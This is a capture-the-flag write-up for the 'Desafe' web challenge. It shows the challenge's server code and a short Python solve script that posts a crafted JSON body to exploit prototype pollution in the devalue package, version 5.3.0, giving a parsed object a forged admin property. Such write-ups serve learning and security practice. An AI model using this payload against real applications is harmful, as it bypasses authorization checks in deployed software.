---
type: challenge
event: amateurs
name: Desafe
category: web
note: "[[Prototype Pollution]] for [[Devalue]] package version `5.3.0`"
solved: ✅
---



```js
class FlagRequest {
  constructor(feedback) {
    // your feedback is greatly appreciated!
    delete { feedback }
  }
  
  get flag() {
    if (this.admin) {
      return FLAG;
    } else {
      return "haha nope"
    }
  }
}

app.post('/', async (c) => {
  const body = await c.req.text();

  const flagRequest = devalue.parse(body, {
    FlagRequest: ([a]) => new FlagRequest(a),
  })

  
  if (!(flagRequest instanceof FlagRequest)) return c.text('not a flag request')

  return c.text(flagRequest.flag)
})
```

We can observe the target: `c.text(flagRequest.flag)` so we want to bypass:
- `flagRequest instanceof FlagRequest`: The body of the `POST` request must be parsed to a `FlagRequest`.
- `flagRequest.admin != null`: The `FlagRequest` object must have a non-exist property `admin`.

Then, we want to do a [[Prototype Pollution]] for [[Devalue]] package.

Solve script:

```python
import requests
import json

target = 'https://web-desafe-zwxpvdfa.amt.rs/'

body = json.dumps(
  [
    {
      "admin": 1,
      "__proto__": 2
    },
    1,
    ["FlagRequest", 3],
    []
  ]
)

print(body)

r = requests.post(
  target,
  data = body
)

print(r.content)
```

